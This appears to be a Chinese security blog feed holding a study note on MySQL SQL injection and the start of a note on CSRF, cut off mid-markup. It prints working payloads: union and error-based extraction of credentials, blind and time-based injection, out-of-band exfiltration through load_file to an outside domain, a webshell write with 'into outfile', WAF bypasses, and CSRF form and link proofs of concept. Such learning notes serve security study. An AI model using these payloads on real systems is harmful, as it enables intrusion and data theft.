alt><br>（2）判断回显的字段，就是查看那个字段可以在页面中看见，需要注意的时，要使得参数报错，我们才能获取回显的字段，从图中也可以看到，如果不使其参数报错，其实仍然还是正常的回显，这里是都可以看到回显的<br><img src="/3724188629/2.png" alt><br>（3）获取当前数据库的表信息<br>跟上面的大致一样，就直接放payload了</p><pre><code>select * from admin where id = 0 union select group_concat(table_name),2,3 from information_schema.tables where table_schema = database();</code></pre><p><code>group_concat</code>是连接字符串函数，是为了是数据全都在一行显示出来，也可以用<code>limit x,1</code>来遍历获取<br><img src="/3724188629/3.png" alt><br>（4）获取表中的列</p><pre><code>select * from admin where id = 0 union select group_concat(column_name),2,3 from information_schema.columns where table_name = &#39;admin&#39;;</code></pre><p>（5）获取字段</p><pre><code>select * from admin where id = 0 union select group_concat(user),group_concat(password),3 from admin;</code></pre><p>union联合注入，算是回显注入，目前应该很少有了，大多是盲注</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入利用的是mysql中一些函数的错误使用会导致mysql信息回显，而这些回显信息中就包含我们构造的查询语句的返回结果</p><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h4><p>payload：</p><pre><code>&#39; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --</code></pre><p><img src="/3724188629/4.png" alt></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><pre><code>&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) --</code></pre><blockquote><p>updatexml()函数有三个参数，分别是(XML_document, XPath_string, new_value)<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>而如果在Xpath中遇到特殊字符就会报错如0x3a、0x7e等</p></blockquote><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>payload：</p><pre><code>&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --</code></pre><p><img src="/3724188629/5.png" alt></p><blockquote><p>extractvalue(xml_str , Xpath) 函数，和updatexml同理</p></blockquote><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><pre><code>&#39; and geometrycollection((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><pre><code>&#39; and multipoint((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><pre><code>&#39; and polygon((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a>multipolygon()</h4><pre><code>&#39; and multipolygon((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><pre><code>&#39; and linestring((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><pre><code>&#39; and multilinestring((select * from(select * from(select user())a)b)) --</code></pre><p>#5.5以上不适用</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><pre><code>&#39; and exp(~(select * from(select user())a)) --</code></pre><p>#5.5以上不适用</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注就是利用逻辑1，0来判断来获取数据，比如我说数据库里有admin表，返回1，则存在，0则不存在，以此类推，而布尔盲注则是根据页面是否异常来进行判断，页面异常，说明是0，无异常就是1。更多的就是绕waf了，通过构造逻辑语句进行判断，下面是一些常见的盲注payload（学长整理的，白嫖一波），文章最后还会把一些常见的函数分类整理，这里先提一下。</p><pre><code>select * from bsqli where id = &#39;1&#39;||1||&#39;&#39;;select * from bsqli where id = 1^0;select (ascii((substr(user(),1,1))) &gt;&gt; 7)=0select left(database(),1)&gt;&#39;s&#39;ascii(substr((select table_name information_schema.tables where tables_schema=databaseORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY idselect instr(version(),&#39;3&#39;)=1select * from bsqli where id = 1 and elt((1&gt;1)+1,1=1,sleep(1));select * from bsqli where id = 1 and field(1&gt;1,sleep(1));select locate(&#39;root&#39;,user());select position(&#39;root&#39; in user());regexp正则注⼊: select user() regexp &#39;^root&#39;;like匹配注⼊: select user() like &#39;ro%&#39;</code></pre><blockquote><p>instr(str,substr):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>locate(substr,str):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>position(substr in str):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>field(str, str1, str2, str3, ……)<br>该函数返回的是在str1,str2……中找str这个字符串的位置的索引，起始为1，如果找不到返回 0。</p><p>elt(n ,str1 ,str2 ,str3 ,…)<br>函数使⽤说明：如果n=1，则返回str1,如果n=2，则返回str2,依次类推。如果n小于1或大于参数个数，返回NULL。</p></blockquote><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>利用时间函数来根据页面的响应时间来进行判断，而不是页面异常<br>payload:</p><pre><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))if(ascii(substr(database(),1,1))&gt;115,0,BENCHMARK(5000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)))if(ascii(substr(database(),1,1))&gt;115,0,(select * from mysql.general_log))SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;select * from ctf where flag = 1 and 0 and get_lock(&#39;username&#39;,5);</code></pre><h3 id="OOB注入（DNSlog）"><a href="#OOB注入（DNSlog）" class="headerlink" title="OOB注入（DNSlog）"></a>OOB注入（DNSlog）</h3><p>只在windows环境下有效，利用<code>load_file</code>函数，请求我们的服务器，和XXE的OOB一样。需要注意的是若在域名中混⼊特殊字符有可能会解析失败，因此最好还是将数据⽤⼗六进制编码后带出，同时还要注意load_file()一次只能传输一条数据，需要利用limit一个个分开</p><pre><code>select load_file(concat(&#39;\\\\&#39;,hex(version()),&#39;.femcih.exeye.io\\a.txt&#39;));</code></pre><p><img src="/3724188629/8.png" alt><br>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数</p><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>order by注⼊也就是order by后⾯的参数可控。常⻅思路是构造逻辑判断语句，通过不同的<br>逻辑结果将查询集和根据不同的列进⾏排列。或者可以直接在order by后⾯构造if语句，利⽤<br>延时盲注获取数据。<br>涉及函数：<br>if()函数<br>updatexml()函数<br>extractvalue()函数<br>regexp()函数<br>rand()函数</p><h3 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h3><p>所谓limit注⼊也就是指limit之后的参数可控，因此我们可以使⽤limit注⼊。但是limit注⼊有<br>版本限制，此方法仅适⽤于5.0.0&lt;mysql&lt;5.6.6的版本。还有的说如果不加order by可以用联合，但是我失败了，不知道是不是数据库版本的问题。</p><p>先附mysql5中select的语法</p><pre><code>SELECT     [ALL | DISTINCT | DISTINCTROW ]       [HIGH_PRIORITY]       [STRAIGHT_JOIN]       [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]       [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]     select_expr [, select_expr ...]     [FROM table_references     [WHERE where_condition]     [GROUP BY {col_name | expr | position}       [ASC | DESC], ... [WITH ROLLUP]]     [HAVING where_condition]     [ORDER BY {col_name | expr | position}       [ASC | DESC], ...]     [LIMIT {[offset,] row_count | row_count OFFSET offset}]     [PROCEDURE procedure_name(argument_list)]     [INTO OUTFILE &#39;file_name&#39; export_options       | INTO DUMPFILE &#39;file_name&#39;       | INTO var_name [, var_name]]     [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><p>可以看到在limit 后面其实还可以跟<code>PROCEDURE</code>和<code>INTO</code>这就是可以利用的地方了，<code>INFO</code>写入文件需要知道绝对绝对路径和写入shell权限，比较难利用，一般用<code>PROCEDURE</code></p><p>payload</p><pre><code>select * from admin limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></pre><p>如果利用时间盲注的话，貌似sleep是不行的 ，可以用<code>BENCHMARK</code><br>2020.4.14补充：<br>延时注入payload</p><pre><code>procedure analyse((extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000,SHA1(1)),1))))),1);%23测试网上的带有select，都失败了 limit后面应该是不能又select的不知道是不是我的原因，还是其他师傅们的payload有问题</code></pre><p>写shell payload</p><pre><code>into outfile &#39;D:/2.php&#39; LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e</code></pre><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>一、当某字符的大小为一个字节时，称其字符为窄字节.<br>二、当某字符的大小为两个字节时，称其字符为宽字节.<br>三、所有英文默认占一个字节，汉字占两个字节<br>四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等</p></blockquote><p>转义函数：</p><blockquote><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串<br>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符<br>mysql_escape_string()  转义一个字符串<br>magic_quote_gpc开启，高版本PHP已经移除</p></blockquote><p>宽字节注入的产生就是由于数据库利用的是GBK编码，而PHP则是UTF-8编码，同时在PHP中为了安全又会对单引号或是双引号进行转义操作（加斜杠），而当php把数据传到sql时，sql数据库先根据character_set_client 对 SQL 语句进行解码后，然后根据系统变量character_set_connection 对解码后的十六进制进行编码，若此时的<code>character_set_client</code>为gbk的话，则会把utf-8当成gpk导致绕过单引号。<br><img src="/3724188629/7.png" alt></p><p>如：<br>传入 <code>1&#39;</code>，被php转义后变为<code>1\&#39;</code>，这其实没什么问题，但当我们传入<code>1%df&#39;</code>是就会变成<code>1%df\&#39;</code>编码看的话是<code>1%df%5c&#39;</code>，而<code>%df%5c</code>在GBK编码下是一个繁体字“連”，这就导致单引号被绕过。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>直接上一位师傅画的图<br><img src="https://img-blog.csdnimg.cn/20191028152937942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt></p><p>涉及的函数和宽字节注入是一样的，都是由转义造成的，话说其实很想知道为什么到sql后斜杠就被去除了……二次注入感觉漏洞挖掘中遇到的次数挺多的，尤其是dede，貌似就有好几个,而且一般框架基本全部的传值都在初始化的时候就被转义了。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入可以执行任意的语句，多条sql一起执行，在MYSQL命令框中，常以;作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句 。<br>但是这种仍有局限性：<br>（1）可能受到API或者数据库引擎不支持的限制<br>（2）权限不足</p><p>现实场景一般遇不到，出现在CTF中，可参考强网杯的题目</p><h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><p>还以一些其他的XFF注入（IP处），base64注入（base64解码），Cookie（cookie处）注入，都是字面意思了……就不写了，太懒了。</p><h2 id="0x06-常见绕过姿势"><a href="#0x06-常见绕过姿势" class="headerlink" title="0x06 常见绕过姿势"></a>0x06 常见绕过姿势</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>在sql中是不区分大小写的，但是过滤函数可能会，所以就导致了绕过<br>区分大小写的函数：<br>1、ereg()函数<br>2、strstr()<br>3、以及不加i的正则<br>4、……</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>非贪婪匹配，导致只匹配了一次，而且把结果转换为空</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>各种编码哈，url，16进制之类的，主要看怎么处理的参数，同时看那些函数支持16进制。</p><pre><code>unicode?id=10%D6‘%20AND%201=2%23 SELECT &#39;Ä&#39;=&#39;A&#39;; #116进制SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></pre><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><pre><code>hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()substr((select &#39;password&#39;),1,1) = 0x70strcmp(left(&#39;password&#39;,1), 0x69) = 1strcmp(left(&#39;password&#39;,1), 0x70) = 0strcmp(left(&#39;password&#39;,1), 0x71) = -1mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir() ……</code></pre><h3 id="关键字替换"><a href="#关键字替换" class="headerlink" title="关键字替换"></a>关键字替换</h3><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><h5 id="、-、（）等替代空格"><a href="#、-、（）等替代空格" class="headerlink" title="/**/、+、（）等替代空格"></a>/**/、+、（）等替代空格</h5><p>如<code>1’/**/union/**/select/**/version();</code> 利用<code>/**/</code>来绕过空格<br>可以绕过</p><pre><code>$ptn = ‘/\s+关键字/’;</code></pre><h5 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h5><p><code>/*!关键字*/</code> <code>/*!XXXXX关键字/</code>等同于空格，xxxxx可以加数字如50001，但是有的行有的不行不知道什么原理，数据库没学好……知道师傅希望指点一下<br>如：</p><pre><code>1’/*!union*//*!select*//*!version()*/ ;</code></pre><h4 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h4><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p><h4 id="逻辑符号的替换"><a href="#逻辑符号的替换" class="headerlink" title="逻辑符号的替换"></a>逻辑符号的替换</h4><p>1、and=&amp;&amp;<br>2、or=||<br>3、not=!<br>4、xor=|</p><h4 id="比较符-的过滤绕过"><a href="#比较符-的过滤绕过" class="headerlink" title="比较符(=)的过滤绕过"></a>比较符(=)的过滤绕过</h4><p>1、like<br>2、in<br>3、between and<br>4、regexp<br>5、……</p><h4 id="比较符号-gt-、-lt-绕过"><a href="#比较符号-gt-、-lt-绕过" class="headerlink" title="比较符号( &gt;、&lt; )绕过"></a>比较符号( &gt;、&lt; )绕过</h4><p>1、greatest<br>2、between and</p><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><blockquote><p>提供多个parameter= value的值集来混淆绕过WAF。鉴于  <a href="http://example.com?id=1&amp;?id=&#39;" target="_blank" rel="noopener">http://example.com?id=1&amp;?id=&#39;</a>  或’1’=’1’ - ‘在某些情况下（例如使用Apache / PHP），应用程序将仅解析最后一个（第二个） id =， WAF只解析第一个id=。这似乎是一个合理的请求，但应用程序仍然接收并处理恶意输入。今天的大多数WAF都不容易受到HTTP参数污染（HPP）的影响，但仍然值得一试。</p></blockquote><pre><code>（id=1 union select+1,2,3+from+users+where+id=1–变为id=1 union select+1&amp;id=2,3+from+users+where+id=1–）</code></pre><h3 id="缓冲区溢出绕过"><a href="#缓冲区溢出绕过" class="headerlink" title="缓冲区溢出绕过"></a>缓冲区溢出绕过</h3><blockquote><p>WAF始终是应用程序，容易受到与其他应用程序相同的软件缺陷的影响。如果出现缓冲区溢漏洞可能会导致WAF崩溃，即使它不会导致代码执行也可能会导致WAF正常运行。</p></blockquote><pre><code> (id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</code></pre><h2 id="0x07-常用函数整理"><a href="#0x07-常用函数整理" class="headerlink" title="0x07 常用函数整理"></a>0x07 常用函数整理</h2><h3 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h3><pre><code>left(str,index)  //从左边第index开始截取right(str,index) //从右边第index开始截取substring(str,index) //从左边index开始截取substr(str,index,len) //截取str,index开始,截取len的长度mid(str,index,ken) //截取str 从index开始,截取len的长度</code></pre><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><pre><code>strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1find_in_set(str,strlist) //如果相同则返回1不同则返回0</code></pre><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><pre><code>concat(str1,str2) //将字符串首尾相连concat_ws(separator,str1,str2) //将字符串用指定连接符连接group_concat()//将多行查询结果以逗号分隔全部输出</code></pre><h3 id="延迟函数"><a href="#延迟函数" class="headerlink" title="延迟函数"></a>延迟函数</h3><pre><code>sleep(seconds) //让代码执行延迟若干秒。benchmark(count,expr) //重复执行指令get_lock //设法使用字符串str 给定的名字得到一个锁， 超时为timeout 秒。若成功得到锁，则返回 1，若操作超时则返回0</code></pre><h3 id="布尔型函数"><a href="#布尔型函数" class="headerlink" title="布尔型函数"></a>布尔型函数</h3><blockquote><p>instr(str,substr):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>locate(substr,str):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>position(substr in str):<br>返回字符串str中第⼀次出现⼦字符串substr的位置。</p><p>field(str, str1, str2, str3, ……)<br>该函数返回的是在str1,str2……中找str这个字符串的位置的索引，起始为1，如果找不到返回 0。</p><p>elt(n ,str1 ,str2 ,str3 ,…)<br>函数使⽤说明：如果n=1，则返回str1,如果n=2，则返回str2,依次类推。如果n小于1或大于参数个数，返回NULL。</p></blockquote><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre><code>@@HOSTNAME //主机名称@@datadir //数据库路径@@version_compile_os //操作系统版本current_user() //当前登录用户和登录主机名system_user() //数据库系统用户账户名称和登录主机名session_user() //当前会话用户名和登录主机名COUNT(column_name) //返回指定列的值的数目（NULL 不计入）lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</code></pre><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>这文章也就稍微说了个大概，主要还是梳理下思路，bypass更多的还是各种函数灵活运用打配合，建议配本mysql手册，很多也都可以单独拿出来做一篇文章的，就如dnslog注入，其实也可以用于ssrf等……后面可能会整理下，或者找个好的文章转载了。还是得好好学学mysql数据库，很多原理性的东西不是很了解。防御方式大概在思维导图提一下</p><h2 id="0x09-思维导图"><a href="#0x09-思维导图" class="headerlink" title="0x09 思维导图"></a>0x09 思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200409232226.png" alt></p><h2 id="0x10-参考文章"><a href="#0x10-参考文章" class="headerlink" title="0x10 参考文章"></a>0x10 参考文章</h2><p><a href="https://joner11234.github.io/2019/04/15/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://joner11234.github.io/2019/04/15/SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</a><br><a href="https://xz.aliyun.com/t/2869#toc-30" target="_blank" rel="noopener">https://xz.aliyun.com/t/2869#toc-30</a><br><a href="https://xz.aliyun.com/t/3992#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992#toc-4</a><br><a href="https://www.cnblogs.com/backlion/p/8622523.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8622523.html</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞学习</title>
      <link href="/95464039.html"/>
      <url>/95464039.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这是CSRF篇哈，如果说XSS主要在于前端和浏览器的话，CSRF可能就更接近浏览器和前端的知识，面比较广，关于浏览器和一些策略只做简单了解。</p><h2 id="0x01什么是CSRF？"><a href="#0x01什么是CSRF？" class="headerlink" title="0x01什么是CSRF？"></a>0x01什么是CSRF？</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)是一种挟持用户在当前已登录的Web应用程序上执行非本意的操作的一种攻击方式。</p><blockquote><p>简单的说，跨站请求伪造攻击是攻击者通过手段欺骗用户的浏览器去访问用户曾经认证过的网站并执行一些操作（如发送邮件、发消息、甚至财产操作如转账和购买商品等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web登录身份认证的一个漏洞：简单的身份认证只能保证请求来自用户的浏览器，但不能识别请求是用户自愿发出的</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用身份认证的缺陷，通过在恶意站点伪造请求，诱使被攻击者携带存储在浏览器中的认证信息去执行被伪造的请求，而导致操作被执行。主要的原因就在于，站点对于身份认证机制不完全所导致的。</p><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>没具体看同源策略的产生事件（补充：1995年），不过我猜测同源策略应该是再csrf之后产生的，通过上面我们就可以发现，要利用的话需要执行挂站点的操作也就是（域）。而同源策略则是再这个地方做了限制，下面会略微讲一下什么是同源策略：附一个连接：<a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="noopener">再谈同源策略</a>这篇对同源策略和CORS做了讲解</p><h4 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h4><p>何为同源：</p><blockquote><p>如果两个页面拥有相同的协议（http、https）、相同的端口（如果其中一个指定了端口）、相同的 host，那么就可以认为这两个页面是同源的。简单的讲，同源策略就是同协议、同端口、同 host 这样的一个三元组（需要注意的是IE当中，不检查端口）</p></blockquote><p><img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/review-sop-1.png" alt><br>到这里大概以知道同源策略是做什么的了，就是限制非同源之间的访问。</p><blockquote><p>同源策略是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p></blockquote><p>这样就能防止CSRF了嘛？明显不可能，网站之间肯定要进行跨域操作的，尤其是随着目前互联网之间的各种交互，而明显有同源策略的限制很不方便，这就是JSONP、CORS的由来了……但基于JSONP、CORS仍产生了很多的安全问题如：JSONP跨域漏洞和CORS跨域漏洞，这里不做详解，回头专门总结下。<del>其实我不认为这属于CSRF漏洞，感觉更多的类似于中间件漏洞一样，利用这个来实现我们的跨域操作</del>（补充一下，了解完之后，我发现其实也算是CSRF的一个变种，刚开始没理解有什么作用，但是了解后发现，跨域漏洞的利用是为了跨域读，来获取用户的敏感信息，这是CSRF做不到的，但也有一些局限性，必须要有敏感信息的输出，才能够劫持），继续回到同源策略，其实不利用上面的两种方式仍能进行跨域，原因的话就是同源操纵的限制了。看下面：</p><p>对于页面跨域的行为分为三类：<br>（1） <strong>跨域写操作（Cross-origin writes）</strong>一般是被允许的。例如链接（links），重定向以及表单提交。特定少数的HTTP请求需要添加 preflight。<br>（2）<strong>跨域资源嵌入（Cross-origin embedding）</strong>一般是被允许<br>（3）<strong>跨域读操作（Cross-origin reads）</strong>一般是不被允许的，但常可以通过内嵌资源来巧妙的进行读取访问</p><p>可以看到除了读，一般都是允许的，而CSRF本来就是进行的写操作，基本不受影响。下面列举一些允许嵌入的标签：</p><pre><code>(1)&lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 标签嵌入跨域脚本。语法错误信息只能被同源脚本中捕捉到。(2)&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。(3)通过 &lt;img&gt; 展示的图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...(4)通过 &lt;video&gt; 和 &lt;audio&gt; 播放的多媒体资源。(5)通过 &lt;object&gt;、 &lt;embed&gt; 和 &lt;applet&gt; 嵌入的插件。(6)通过 @font-face 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。(7)通过 &lt;iframe&gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</code></pre><p>这样我们利用上面的标签进行跨域 完全可以 如<code>&lt;img&gt;</code></p><h2 id="0x02-CSRF的利用方式"><a href="#0x02-CSRF的利用方式" class="headerlink" title="0x02 CSRF的利用方式"></a>0x02 CSRF的利用方式</h2><h3 id="可利用标签"><a href="#可利用标签" class="headerlink" title="可利用标签"></a>可利用标签</h3><p>可利用方式如下：</p><pre><code>&lt;a&gt;标签&lt;img&gt;标签&lt;script&gt;标签&lt;iframe&gt;标签&lt;link&gt;标签CSS方法JavaScript方法：Image对象、XMLHTTP对象</code></pre><p>下面列举一下常用的形式<br>burp生成form标签：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>URL<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test2<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>a标签</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>URL?test<span class="token punctuation">=</span>666&amp;test1<span class="token punctuation">=</span>666&amp;Change<span class="token punctuation">=</span>Change#<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>Click Me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token 